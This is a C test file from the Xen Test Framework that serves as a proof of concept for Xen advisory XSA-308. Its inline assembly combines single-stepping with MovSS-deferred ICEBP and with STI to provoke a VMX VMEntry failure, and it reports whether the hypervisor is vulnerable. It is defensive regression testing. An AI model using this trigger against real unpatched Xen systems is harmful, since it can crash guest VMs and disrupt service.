/**
 * @file tests/xsa-308/main.c
 * @ref test-xsa-308
 *
 * @page test-xsa-308 XSA-308
 *
 * Advisory: [XSA-308](https://xenbits.xen.org/xsa/advisory-308.html)
 *
 * The VMX VMEntry checks does not like the exact combination of state which
 * occurs when @#DB in intercepted, Single Stepping is active, and blocked by
 * STI/MovSS is active, despite this being a legitimate state to be in.
 *
 * The exact sequence is the interaction of a MovSS-deferred ICEBP @#DB while
 * Single Stepping is active.  A related sequence which tickles the same
 * failure is an STI while Single Stepping is active.
 *
 * Run both of these sequences.  If the VM is still alive at the end, it
 * didn't suffer a VMEntry failure.
 *
 * @see tests/xsa-308/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-308 PoC";

void __user_text movss(void)
{
    unsigned int tmp;

    asm volatile("mov %%ss, %[tmp];"
                 "pushf;"
                 "pushf;"
                 "orl $"STR(X86_EFLAGS_TF)", (%%"_ASM_SP");"
                 "popf;"
                 "mov %[tmp], %%ss;"
                 ".byte 0xf1;"
                 "1:; "_ASM_TRAP_OK(1b)
                 "popf;"
                 "1:; "_ASM_TRAP_OK(1b)
                 : [tmp] "=r" (tmp));
}

void test_main(void)
{
    exec_user_void(movss);

    asm volatile("pushf;"
                 "pushf;"
                 "orl $"STR(X86_EFLAGS_TF)", (%"_ASM_SP");"
                 "popf;"
                 "sti;"
                 "1:; "_ASM_TRAP_OK(1b)
                 "popf;"
                 "1:; "_ASM_TRAP_OK(1b)
                 "cli;");

    /* If the VM is still alive, it didn't suffer a vmentry failure. */
    xtf_success("Success: Not vulnerable to XSA-308\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
